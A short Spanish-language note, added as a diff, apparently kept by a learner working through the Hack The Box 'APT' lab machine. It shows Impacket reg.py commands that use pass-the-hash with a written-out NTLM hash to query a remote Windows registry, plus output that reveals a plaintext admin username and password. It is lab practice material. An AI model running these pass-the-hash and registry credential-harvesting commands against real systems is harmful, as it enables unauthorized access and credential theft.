@@ -1,0 +1,20 @@
+[*] Maquina practicada APT
+[*] Sirve para obtener registros de una maquina windows
+
+  ~$> reg.py htb.local/henry.vinson@apt.htb -hashes :e53d87d42adaa3ca32bdb34a876cbffb query -keyName HKCR
+
+  [!] HKCR es debido a la keyName, solo es buscar en google registry hives, para ver los distintios keyNames
+  [+] keyNames: HKCR, HKCU, HKLM, HKU, HKCC, and HKPD
+
+[*] En en el caso de la maquina APT, con el keyName HKU podremos tener acceso a varios folders. En concreto puedo llegar a conseguir unas credenciales.
+
+  ~$> reg.py htb.local/henry.vinson@apt.htb -hashes :e53d87d42adaa3ca32bdb34a876cbffb query -keyName 'HKU\Software\GiganticHostingManagementSystem'
+
+  [+] Output:
+
+        UserName    REG_SZ  henry.vinson_adm
+        PassWord    REG_SZ  G1#Ny5@2dvht
+
+[*] En caso de querer exportarlo todo de forma recursiva solo tendremos que ejecutarlo de esta manera
+
+  ~$> reg.py htb.local/henry.vinson@apt.htb -hashes :e53d87d42adaa3ca32bdb34a876cbffb query -keyName 'HKU' -s
